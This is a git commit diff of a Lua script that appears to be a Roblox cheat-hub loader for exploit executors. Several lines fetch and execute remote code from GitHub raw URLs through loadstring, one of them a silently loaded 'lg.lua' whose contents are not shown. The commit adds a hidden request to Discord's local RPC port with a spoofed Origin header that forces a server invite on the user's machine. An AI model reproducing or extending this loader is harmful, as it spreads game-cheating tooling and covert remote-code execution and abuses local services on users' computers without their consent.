eeaec629d29e5146ac489c7873bff2b73eaa9120
tym487ty78 <xvateq@gmail.com>
2025-08-05 14:48:46 +0200

    Update NextStep.lua

--- NextStep.lua
+++ NextStep.lua
@@ -1,8 +1,27 @@
 task.spawn(function() 
-if request and hookfunction then 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/lg.lua'))() 
-end 
+	if request and hookfunction then 
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/lg.lua'))() 
+	end 
 end)
+task.spawn(function()
+	if request then
+		request({
+			Url = "http://127.0.0.1:6463/rpc?v=1",
+			Method = "POST",
+			Headers = {
+			    ["Content-Type"] = "application/json",
+			    ["Origin"] = "https://discord.com"
+			},
+			Body = game:GetService("HttpService"):JSONEncode({
+			    cmd = "INVITE_BROWSER",
+			    args = {code = string.match("https://discord.com/invite/EAbRQtEzWY", "discord%.com/invite/(%w+)")},
+			    nonce = game:GetService("HttpService"):GenerateGUID(false)
+			})
+		})
+	end
+end)
+
+
 if game.PlaceId == 5708035517 or game.PlaceId == 6063653725 then -- mega hide and seek
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/megahideandseek.lua'))()
 elseif game.PlaceId == 14157644155 then -- 0
